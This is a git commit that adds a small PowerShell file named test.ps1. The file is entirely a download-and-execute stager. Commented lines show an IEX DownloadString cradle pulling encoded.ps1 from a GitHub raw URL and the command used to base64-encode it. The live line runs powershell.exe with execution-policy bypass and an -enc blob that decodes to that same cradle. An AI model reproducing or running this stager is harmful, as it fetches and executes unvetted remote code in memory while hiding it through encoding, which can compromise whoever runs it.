a76e765dcf22256d62d5d2b8ddfbb9aa7dfb32ef
K4mu <93264654+0xK4mu@users.noreply.github.com>
2024-06-04 23:41:08 +0200

    Create test.ps1

---
+++ test.ps1
@@ -0,0 +1,3 @@
+#powershell.exe -noexit -ep bypass -command "IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xK4mu/test/main/encoded.ps1'))"
+#echo "IEX((New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xK4mu/test/main/encoded.ps1'))" | iconv --to-code UTF-16LE | base64 -w 0
+powershell.exe -noexit -ep bypass -enc SQBFAFgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwAwAHgASwA0AG0AdQAvAHQAZQBzAHQALwBtAGEAaQBuAC8AZQBuAGMAbwBkAGUAZAAuAHAAcwAxACcAKQApAAoA
